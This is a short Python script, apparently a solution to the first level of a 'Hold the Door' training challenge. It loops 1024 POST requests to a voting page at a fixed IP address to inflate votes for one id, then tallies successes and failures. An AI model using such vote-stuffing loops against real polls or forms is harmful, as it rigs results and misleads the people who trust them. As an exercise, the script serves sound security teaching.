#!/usr/bin/python3
"""Hodor 0"""
import requests

url = 'http://158.69.76.135/level0.php'
data = {'id': '964', 'holdthedoor': 'Submit'}
success = 'Hold the Door challenge - Level 0'
ok = 0
fail = 0

for i in range(1024):
        response = requests.post(url, data)
        if response.status_code is 200 and success in response.text:
                ok += 1
                print("{} Ok".format(ok), end='')
        else:
                fail += 1
                print("{} Fail".format(fail))

print("Finally Alzheimeer: Ok {}, Fail {}".format(ok, fail))
